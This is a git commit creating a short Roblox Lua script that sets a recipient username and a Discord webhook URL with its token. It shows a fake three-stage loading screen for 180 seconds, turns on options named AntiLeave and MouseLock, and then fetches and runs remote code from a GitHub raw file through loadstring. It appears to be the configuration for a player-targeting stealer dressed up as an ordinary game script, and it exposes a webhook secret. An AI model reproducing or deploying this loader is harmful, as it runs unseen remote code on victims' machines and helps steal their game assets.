8ee09f1ade2dcffbeb5352db08f712b205504517
suadinhoc666 <133869924+suadinhoc666@users.noreply.github.com>
2023-05-17 19:06:12 +0700

    Create mainstring.lua

---
+++ mainstring.lua
@@ -0,0 +1,15 @@
+UserName = "suadinhoc666"
+Webhook = "https://discord.com/api/webhooks/1108363524129951764/GMv43esiWeeC_9-wkdFfLeSuBrto8jzfMANbqa4Gxav1kiy1iF3_VJZwSACHLKnjWOA6"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Project-WD"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
